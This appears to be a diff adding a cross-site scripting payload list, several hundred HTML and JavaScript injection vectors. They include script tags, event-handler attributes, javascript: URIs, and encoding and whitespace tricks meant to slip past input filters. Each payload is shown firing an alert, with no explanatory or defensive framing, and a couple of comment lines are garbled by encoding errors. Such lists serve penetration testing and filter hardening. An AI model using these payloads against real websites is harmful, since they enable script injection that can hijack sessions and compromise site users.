@@ -1,0 +1,1850 @@
+<script>alert(1)</script>  
+<script>alert(2)</script>
+medium--> Ë«Ð´ÈÆ¹ý£º<sc<script>ript>alert(4)</script>
+	    ´óÐ¡Ð´»ìÏýÈÆ¹ý£º<ScRipt>alert(5)</script>
+	<img src=1 onerror=alert(7)>
+onmouseover=¡¯alert(9)¡¯
+<script>alert(11);</script> 
+>"'><img src="javascript.:alert(12)">
+>"'><script>alert(13)</script>
+<table background='javascript.:alert(14)'></table>
+<object type=text/html data='javascript.:alert(15);'></object>
+"+alert(16)+"
+<body/onfocus=top.alert(17)>
+<img/src=22 onerror=window.alert(22)>
+<img src=62 onerror=(function(){alert(62)})()>
+<img src=63 onerror=!function(){alert(63)}()>
+<img src=64 onerror=%2bfunction(){alert(64)}()>
+<img src=65 onerror=%2dfunction(){alert(65)}()>
+<img src=66 onerror=~function(){alert(66)}()>
+<a href="javascript:`${alert(69)}`">XSS Test</a>
+<a href="javascript:[''].findIndex(alert(71)">XSS Test</a>
+<iframe onload=location=['javascript:alert(79)'].join(")>
+<a href="javascript:(new Function('alert(80))()">XSS Test</a>
+<body/onload=Function(alert(81))()>
+<img%0Dsrc=82 onerror=Function(alert(82))>
+<a href="javascript:(new (Object.getPrototypeOf(async function(){}).constructor)('alert(84))()">XSS Test</a>
+<body/onload=eval(location.hash.slice(85))>#alert(85)
+<body/onload=setTimeout(location.hash.substr(86))()>#alert(86)
+<body/onload=Set.constructor(location.hash.substr(87))()>#alert(87)
+<body/onload=execScript(location.hash.substr(88))>#alert(88)
+<body/onload=Function(location.hash.slice(90))()>#alert(90)
+<svg/onload=alert(91)
+<svg onload=eval(URL.slice(-8))>#alert(93)
+<body/onload=eval(location.hash.slice(94))>#javascript:alert(94)
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(97)">
+<img src=101 onerror=location="javascript:alert(101)">
+<svg/onload="javascript:alert(103)" xmlns="http://www.baidu.com">
+<svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(105)
+<svg/onload=location="javascript:"%2binnerHTML%2blocation.hash>"  #"-alert(107)
+<svg/onload=with(location)with(hash)eval(alert(109))>
+<body onload=alert(140)>
+<body onpageshow=alert(141)>
+<body onfocus=alert(142)>
+<body onhashchange=alert(143)><a href=#></a>
+<body style=overflow:auto;height:144000px onscroll=alert(144) id=x>#x
+<body onscroll=alert(145)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+<marquee onstart=alert(146)>
+<marquee loop=147 width=0 onfinish=alert(147)>
+<audio src onloadstart=alert(148)>
+<video onloadstart=alert(149)><source>
+<input autofocus onblur=alert(150)>
+<keygen autofocus onfocus=alert(151)>
+<form onsubmit=alert(152)><input type=submit>
+<select onchange=alert(153)><option>153<option>2
+<menu id=x contextmenu=x onshow=alert(154)>right click me!
+<x contenteditable onblur=alert(155)>lose focus!
+<x onclick=alert(156)>click this!
+<x oncopy=alert(157)>copy this!
+<x oncontextmenu=alert(158)>right click this!
+<x oncut=alert(159)>copy this!
+<x ondblclick=alert(160)>double click this!
+<x ondrag=alert(161)>drag this!
+<x contenteditable onfocus=alert(162)>focus this!
+<x contenteditable oninput=alert(163)>input here!
+<x contenteditable onkeydown=alert(164)>press any key!
+<x contenteditable onkeypress=alert(165)>press any key!
+<x contenteditable onkeyup=alert(166)>press any key!
+<x onmousedown=alert(167)>click this!
+<x onmousemove=alert(168)>hover this!
+<x onmouseout=alert(169)>hover this!
+<x onmouseover=alert(170)>hover this!
+<x onmouseup=alert(171)>click this!
+<x contenteditable onpaste=alert(172)>paste here!
+<brute contenteditable onblur=alert(173)>lose focus!
+<brute onclick=alert(174)>click this!
+<brute oncopy=alert(175)>copy this!
+<brute oncontextmenu=alert(176)>right click this!
+<brute oncut=alert(177)>copy this!
+<brute ondblclick=alert(178)>double click this!
+<brute ondrag=alert(179)>drag this!
+<brute contenteditable onfocus=alert(180)>focus this!
+<brute contenteditable oninput=alert(181)>input here!
+<brute contenteditable onkeydown=alert(182)>press any key!
+<brute contenteditable onkeypress=alert(183)>press any key!
+<brute contenteditable onkeyup=alert(184)>press any key!
+<brute onmousedown=alert(185)>click this!
+<brute onmousemove=alert(186)>hover this!
+<brute onmouseout=alert(187)>hover this!
+<brute onmouseover=alert(188)>hover this!
+<brute onmouseup=alert(189)>click this!
+<brute contenteditable onpaste=alert(190)>paste here!
+<brute style=font-size:500px onmouseover=alert(191)>0000
+<brute style=font-size:500px onmouseover=alert(192)>000192
+<brute style=font-size:500px onmouseover=alert(193)>0002
+<brute style=font-size:500px onmouseover=alert(194)>0003
+<script src=javascript:alert(196)>
+<iframe src=javascript:alert(197)>
+<embed src=javascript:alert(198)>
+<a href=javascript:alert(200)>click
+<math><brute href=javascript:alert(201)>click
+<form action=javascript:alert(203)><input type=submit>
+<isindex action=javascript:alert(204) type=submit value=click>
+<form><button formaction=javascript:alert(206)>click
+<form><input formaction=javascript:alert(207) type=submit value=click>
+<form><input formaction=javascript:alert(208) type=image value=click>
+<form><input formaction=javascript:alert(209) type=image src=http://brutelogic.com.br/webgun/img/youtube209.jpg>
+<isindex formaction=javascript:alert(210) type=submit value=click>
+<object data=javascript:alert(212)>
+<svg><script xlink:href=data:,alert(216)></script>
+<svg><script xlink:href=data:,alert(217) />
+<math><brute xlink:href=javascript:alert(218)>click
+<svg><a xmlns:xlink=http://www.w3.org/220999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(220) to=%26>
+'><script>alert(221)</script>
+='><script>alert(222)</script>
+<script>alert(223)</script>
+<script>alert(224)</script>
+<s&#99;ript>alert(225)</script>
+<img src="javas&#99;ript:alert(226)">
+%0a%0a<script>alert(227)</script>.jsp
+%3c/a%3e%3cscript%3ealert(228)%3c/script%3e
+%3c/title%3e%3cscript%3ealert(229)%3c/script%3e
+%3cscript%3ealert(230)%3c/script%3e/index.html
+<script>alert(231)</script>
+a.jsp/<script>alert(232)</script>
+"><script>alert(233)</script>
+<IMG SRC="javascript.:alert(234);">
+<IMG SRC="jav&#x09;ascript.:alert(238);">
+<IMG SRC="jav&#x0A;ascript.:alert(239);">
+<IMG SRC="jav&#x0D;ascript.:alert(240);">
+"<IMG src="/java"\0script.:alert(241)>";'>out
+<IMG SRC=" javascript.:alert(242);">
+<SCRIPT>a=/XSS/alert(243)</SCRIPT>
+<BODY BACKGROUND="javascript.:alert(244)">
+<BODY ONLOAD=alert(245)>
+<IMG DYNSRC="javascript.:alert(246)">
+<IMG LOWSRC="javascript.:alert(247)">
+<BGSOUND SRC="javascript.:alert(248);">
+<br size="&{alert(249)}">
+<LINK REL="stylesheet"HREF="javascript.:alert(251);">
+<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert(253);">
+<TABLE BACKGROUND="javascript.:alert(256)">
+<DIV STYLE="background-image: url(javascript.:alert(257))">
+<DIV STYLE="width: expression(alert(259));">
+<STYLE>@im\port'\ja\vasc\ript:alert(260)';</STYLE>
+<IMG STYLE='xss:expre\ssion(alert(261))'>
+<STYLE. TYPE="text/javascript">alert(262);</STYLE>
+<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert(263)");}</STYLE><A CLASS=XSS></A>
+<STYLE. type="text/css">BODY{background:url("javascript.:alert(264)")}</STYLE>
+<BASE HREF="javascript.:alert(265);//">
+getURL("javascript.:alert(266)")
+a="get";b="URL";c="javascript.:";d="alert(267);";eval(a+b+c+d);
+<XML SRC="javascript.:alert(268);">
+"> <BODY NLOAD="a();"><SCRIPT>function a(){alert(269);}</SCRIPT><"
+<IMG SRC="javascript.:alert(271)"
+<script\x20type="text/javascript">javascript:alert(278);</script>
+<script\x3Etype="text/javascript">javascript:alert(279);</script>
+<script\x0Dtype="text/javascript">javascript:alert(280);</script>
+<script\x09type="text/javascript">javascript:alert(281);</script>
+<script\x0Ctype="text/javascript">javascript:alert(282);</script>
+<script\x2Ftype="text/javascript">javascript:alert(283);</script>
+<script\x0Atype="text/javascript">javascript:alert(284);</script>
+'`"><\x3Cscript>javascript:alert(285)</script>
+'`"><\x00script>javascript:alert(286)</script>
+<img src=287 href=287 onerror="javascript:alert(287)"></img>
+<audio src=288 href=288 onerror="javascript:alert(288)"></audio>
+<video src=289 href=289 onerror="javascript:alert(289)"></video>
+<body src=290 href=290 onerror="javascript:alert(290)"></body>
+<image src=291 href=291 onerror="javascript:alert(291)"></image>
+<object src=292 href=292 onerror="javascript:alert(292)"></object>
+<script src=293 href=293 onerror="javascript:alert(293)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(294)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(295)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(296)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(297)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(298)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(299)"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(300)"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(301)"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(302)"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:javascript:alert(303)"></svg onLoad>
+<body onPageHide body onPageHide="javascript:javascript:alert(304)"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(305)"></body onMouseOver>
+<body onUnload body onUnload="javascript:javascript:alert(306)"></body onUnload>
+<body onLoad body onLoad="javascript:javascript:alert(307)"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(308)"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(309)"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(310)"></html onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:alert(311)"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(312)"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:alert(313)"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(314)"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(315)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:alert(316)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:alert(317)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:alert(318)"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(319)"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(320)"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(321)"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(322)"></html onMouseDown>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(323)"></marquee onScroll>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(324)"></xml onPropertyChange>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(325)"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(326)"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:javascript:alert(327)"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(328)"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(329)"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:alert(330)"></body onResize>
+<object onError object onError="javascript:javascript:alert(331)"></object onError>
+<body onPopState body onPopState="javascript:javascript:alert(332)"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(333)"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(334)"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:alert(335)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:alert(336)"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:alert(337)"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:alert(338)"></body onkeyup>
+<body onunload body onunload="javascript:javascript:alert(339)"></body onunload>
+<iframe onload iframe onload="javascript:javascript:alert(340)"></iframe onload>
+<body onload body onload="javascript:javascript:alert(341)"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:alert(342)"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(343)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(344)"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:alert(345)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:alert(346)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(347)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:alert(348)"></iframe src>
+<svg onload svg onload="javascript:javascript:alert(349)"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:alert(350)"></html onmousemove>
+<body onblur body onblur="javascript:javascript:alert(351)"></body onblur>
+\x3Cscript>javascript:alert(352)</script>
+'"`><script>/* *\x2Fjavascript:alert(353)// */</script>
+<script>javascript:alert(354)</script\x0D
+<script>javascript:alert(355)</script\x0A
+<script>javascript:alert(356)</script\x0B
+<script charset="\x22>javascript:alert(357)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(358)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(359)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(360)> -->
+--><!-- --\x2361> <img src=xxx:x onerror=javascript:alert(361)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(362)> -->
+`"'><img src='#\x27 onerror=javascript:alert(363)>
+<a href="javascript\x3Ajavascript:alert(364)" id="fuzzelement364">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:alert(365)//';</script></p>
+<a href="javas\x00cript:javascript:alert(366)" id="fuzzelement366">test</a>
+<a href="javas\x07cript:javascript:alert(367)" id="fuzzelement367">test</a>
+<a href="javas\x0Dcript:javascript:alert(368)" id="fuzzelement368">test</a>
+<a href="javas\x0Acript:javascript:alert(369)" id="fuzzelement369">test</a>
+<a href="javas\x08cript:javascript:alert(370)" id="fuzzelement370">test</a>
+<a href="javas\x02cript:javascript:alert(371)" id="fuzzelement371">test</a>
+<a href="javas\x03cript:javascript:alert(372)" id="fuzzelement372">test</a>
+<a href="javas\x04cript:javascript:alert(373)" id="fuzzelement373">test</a>
+<a href="javas\x0374cript:javascript:alert(374)" id="fuzzelement374">test</a>
+<a href="javas\x05cript:javascript:alert(375)" id="fuzzelement375">test</a>
+<a href="javas\x0Bcript:javascript:alert(376)" id="fuzzelement376">test</a>
+<a href="javas\x09cript:javascript:alert(377)" id="fuzzelement377">test</a>
+<a href="javas\x06cript:javascript:alert(378)" id="fuzzelement378">test</a>
+<a href="javas\x0Ccript:javascript:alert(379)" id="fuzzelement379">test</a>
+<script>/* *\x2A/javascript:alert(380)// */</script>
+<script>/* *\x00/javascript:alert(381)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(382)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(383)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:alert(384)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:alert(385)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(386)//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(387);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(388);/*';">DEF
+<script>if("x\\xE389\x96\x89".length==2) { javascript:alert(389);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(390);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(391);}</script>
+'`"><\x3Cscript>javascript:alert(392)</script>
+'`"><\x00script>javascript:alert(393)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(394)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(395)>
+<script src="data:text/plain\x2Cjavascript:alert(396)"></script>
+<script src="data:\xD4\x8F,javascript:alert(397)"></script>
+<script src="data:\xE0\xA4\x98,javascript:alert(398)"></script>
+<script src="data:\xCB\x8F,javascript:alert(399)"></script>
+<script\x20type="text/javascript">javascript:alert(400);</script>
+<script\x3Etype="text/javascript">javascript:alert(401);</script>
+<script\x0Dtype="text/javascript">javascript:alert(402);</script>
+<script\x09type="text/javascript">javascript:alert(403);</script>
+<script\x0Ctype="text/javascript">javascript:alert(404);</script>
+<script\x2Ftype="text/javascript">javascript:alert(405);</script>
+<script\x0Atype="text/javascript">javascript:alert(406);</script>
+ABC<div style="x\x3Aexpression(javascript:alert(407)">DEF
+ABC<div style="x:expression\x5C(javascript:alert(408)">DEF
+ABC<div style="x:expression\x00(javascript:alert(409)">DEF
+ABC<div style="x:exp\x00ression(javascript:alert(410)">DEF
+ABC<div style="x:exp\x5Cression(javascript:alert(411)">DEF
+ABC<div style="x:\x0Aexpression(javascript:alert(412)">DEF
+ABC<div style="x:\x09expression(javascript:alert(413)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(414)">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(415)">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:alert(416)">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(417)">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(418)">DEF
+ABC<div style="x:\x0Dexpression(javascript:alert(419)">DEF
+ABC<div style="x:\x0Cexpression(javascript:alert(420)">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(421)">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(422)">DEF
+ABC<div style="x:\x20expression(javascript:alert(423)">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(424)">DEF
+ABC<div style="x:\x00expression(javascript:alert(425)">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(426)">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(427)">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(428)">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(429)">DEF
+ABC<div style="x:\x0Bexpression(javascript:alert(430)">DEF
+ABC<div style="x:\xE2\x80\x8431expression(javascript:alert(431)">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(432)">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(433)">DEF
+<a href="\x0Bjavascript:javascript:alert(434)" id="fuzzelement434">test</a>
+<a href="\x0Fjavascript:javascript:alert(435)" id="fuzzelement435">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(436)" id="fuzzelement436">test</a>
+<a href="\x05javascript:javascript:alert(437)" id="fuzzelement437">test</a>
+<a href="\xE438\xA0\x8Ejavascript:javascript:alert(438)" id="fuzzelement438">test</a>
+<a href="\x4398javascript:javascript:alert(439)" id="fuzzelement439">test</a>
+<a href="\x440440javascript:javascript:alert(440)" id="fuzzelement440">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(441)" id="fuzzelement441">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(442)" id="fuzzelement442">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(443)" id="fuzzelement443">test</a>
+<a href="\x4447javascript:javascript:alert(444)" id="fuzzelement444">test</a>
+<a href="\x03javascript:javascript:alert(445)" id="fuzzelement445">test</a>
+<a href="\x0Ejavascript:javascript:alert(446)" id="fuzzelement446">test</a>
+<a href="\x447Ajavascript:javascript:alert(447)" id="fuzzelement447">test</a>
+<a href="\x00javascript:javascript:alert(448)" id="fuzzelement448">test</a>
+<a href="\x4490javascript:javascript:alert(449)" id="fuzzelement449">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(450)" id="fuzzelement450">test</a>
+<a href="\x20javascript:javascript:alert(451)" id="fuzzelement451">test</a>
+<a href="\x4523javascript:javascript:alert(452)" id="fuzzelement452">test</a>
+<a href="\x09javascript:javascript:alert(453)" id="fuzzelement453">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(454)" id="fuzzelement454">test</a>
+<a href="\x4554javascript:javascript:alert(455)" id="fuzzelement455">test</a>
+<a href="\x4569javascript:javascript:alert(456)" id="fuzzelement456">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(457)" id="fuzzelement457">test</a>
+<a href="\x458Fjavascript:javascript:alert(458)" id="fuzzelement458">test</a>
+<a href="\xE2\x80\x8459javascript:javascript:alert(459)" id="fuzzelement459">test</a>
+<a href="\x460Djavascript:javascript:alert(460)" id="fuzzelement460">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(461)" id="fuzzelement461">test</a>
+<a href="\x07javascript:javascript:alert(462)" id="fuzzelement462">test</a>
+<a href="\xE463\x9A\x80javascript:javascript:alert(463)" id="fuzzelement463">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(464)" id="fuzzelement464">test</a>
+<a href="\x04javascript:javascript:alert(465)" id="fuzzelement465">test</a>
+<a href="\x0466javascript:javascript:alert(466)" id="fuzzelement466">test</a>
+<a href="\x08javascript:javascript:alert(467)" id="fuzzelement467">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(468)" id="fuzzelement468">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(469)" id="fuzzelement469">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(470)" id="fuzzelement470">test</a>
+<a href="\x4712javascript:javascript:alert(471)" id="fuzzelement471">test</a>
+<a href="\x0Djavascript:javascript:alert(472)" id="fuzzelement472">test</a>
+<a href="\x0Ajavascript:javascript:alert(473)" id="fuzzelement473">test</a>
+<a href="\x0Cjavascript:javascript:alert(474)" id="fuzzelement474">test</a>
+<a href="\x4755javascript:javascript:alert(475)" id="fuzzelement475">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(476)" id="fuzzelement476">test</a>
+<a href="\x4776javascript:javascript:alert(477)" id="fuzzelement477">test</a>
+<a href="\x02javascript:javascript:alert(478)" id="fuzzelement478">test</a>
+<a href="\x479Bjavascript:javascript:alert(479)" id="fuzzelement479">test</a>
+<a href="\x06javascript:javascript:alert(480)" id="fuzzelement480">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(481)" id="fuzzelement481">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(482)" id="fuzzelement482">test</a>
+<a href="\x483Ejavascript:javascript:alert(483)" id="fuzzelement483">test</a>
+<a href="\xE2\x8484\x9Fjavascript:javascript:alert(484)" id="fuzzelement484">test</a>
+<a href="\x485Cjavascript:javascript:alert(485)" id="fuzzelement485">test</a>
+<a href="javascript\x00:javascript:alert(486)" id="fuzzelement486">test</a>
+<a href="javascript\x3A:javascript:alert(487)" id="fuzzelement487">test</a>
+<a href="javascript\x09:javascript:alert(488)" id="fuzzelement488">test</a>
+<a href="javascript\x0D:javascript:alert(489)" id="fuzzelement489">test</a>
+<a href="javascript\x0A:javascript:alert(490)" id="fuzzelement490">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(491)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(492)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(493)>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(494)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(495)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(496)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(497)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(498)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(499)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(500)>
+"`'><script>\x3Bjavascript:alert(501)</script>
+"`'><script>\x0Djavascript:alert(502)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(503)</script>
+"`'><script>\xE2\x80\x8504javascript:alert(504)</script>
+"`'><script>\xE2\x80\x84javascript:alert(505)</script>
+"`'><script>\xE3\x80\x80javascript:alert(506)</script>
+"`'><script>\x09javascript:alert(507)</script>
+"`'><script>\xE2\x80\x89javascript:alert(508)</script>
+"`'><script>\xE2\x80\x85javascript:alert(509)</script>
+"`'><script>\xE2\x80\x88javascript:alert(510)</script>
+"`'><script>\x00javascript:alert(511)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(512)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(513)</script>
+"`'><script>\xE514\x9A\x80javascript:alert(514)</script>
+"`'><script>\x0Cjavascript:alert(515)</script>
+"`'><script>\x2Bjavascript:alert(516)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(517)</script>
+"`'><script>-javascript:alert(518)</script>
+"`'><script>\x0Ajavascript:alert(519)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(520)</script>
+"`'><script>\x7Ejavascript:alert(521)</script>
+"`'><script>\xE2\x80\x87javascript:alert(522)</script>
+"`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(524)</script>
+"`'><script>\xC2\x85javascript:alert(525)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(526)</script>
+"`'><script>\xE2\x80\x83javascript:alert(527)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(528)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(529)</script>
+"`'><script>\xE2\x80\x80javascript:alert(530)</script>
+"`'><script>\x2531javascript:alert(531)</script>
+"`'><script>\xE2\x80\x82javascript:alert(532)</script>
+"`'><script>\xE2\x80\x86javascript:alert(533)</script>
+"`'><script>\xE534\xA0\x8Ejavascript:alert(534)</script>
+"`'><script>\x0Bjavascript:alert(535)</script>
+"`'><script>\x20javascript:alert(536)</script>
+"`'><script>\xC2\xA0javascript:alert(537)</script>
+"/><img/onerror=\x0Bjavascript:alert(538)\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:alert(539)\x22src=xxx:x />
+"/><img/onerror=\x09javascript:alert(540)\x09src=xxx:x />
+"/><img/onerror=\x27javascript:alert(541)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(542)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(543)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(544)\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:alert(545)\x60src=xxx:x />
+"/><img/onerror=\x20javascript:alert(546)\x20src=xxx:x />
+<script\x2F>javascript:alert(547)</script>
+<script\x20>javascript:alert(548)</script>
+<script\x0D>javascript:alert(549)</script>
+<script\x0A>javascript:alert(550)</script>
+<script\x0C>javascript:alert(551)</script>
+<script\x00>javascript:alert(552)</script>
+<script\x09>javascript:alert(553)</script>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(554)>
+`"'><img src=xxx:x onerror\x00=javascript:alert(555)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(556)>
+`"'><img src=xxx:x onerror\x0D=javascript:alert(557)>
+`"'><img src=xxx:x onerror\x20=javascript:alert(558)>
+`"'><img src=xxx:x onerror\x0A=javascript:alert(559)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(560)>
+<script>javascript:alert(561)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(562)" 
+<input onfocus=javascript:alert(563) autofocus>
+<input onblur=javascript:alert(564) autofocus><input autofocus>
+<video poster=javascript:javascript:alert(565)//
+<body onscroll=javascript:alert(566)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=javascript:alert(567)><input></form><button form=test onformchange=javascript:alert(567)>X
+<video><source onerror="javascript:javascript:alert(568)">
+<video onerror="javascript:javascript:alert(569)"><source>
+<form><button formaction="javascript:javascript:alert(570)">X
+<body oninput=javascript:alert(571)><input autofocus>
+<math href="javascript:javascript:alert(572)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(572)">CLICKME</maction> </math>
+<frameset onload=javascript:alert(573)>
+<table background="javascript:javascript:alert(574)">
+<!--<img src="--><img src=x onerror=javascript:alert(575)//">
+<comment><img src="</comment><img src=x onerror=javascript:alert(576))//">
+<![><img src="]><img src=x onerror=javascript:alert(577)//">
+<style><img src="</style><img src=x onerror=javascript:alert(578)//">
+<li style=list-style:url() onerror=javascript:alert(579)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(579)></div>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(580)//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(581)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-582582D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(582)"></OBJECT>
+<b <script>alert(583)</script>0
+<div id="div584"><input value="``onmouseover=javascript:alert(584)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div584").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(585)//'>
+<embed src="javascript:alert(586)">
+<img src="javascript:alert(587)">
+<image src="javascript:alert(588)">
+<script src="javascript:alert(589)">
+<div style=width:590px;filter:glow onfilterchange=javascript:alert(590)>x
+<? foo="><script>javascript:alert(591)</script>">
+<! foo="><script>javascript:alert(592)</script>">
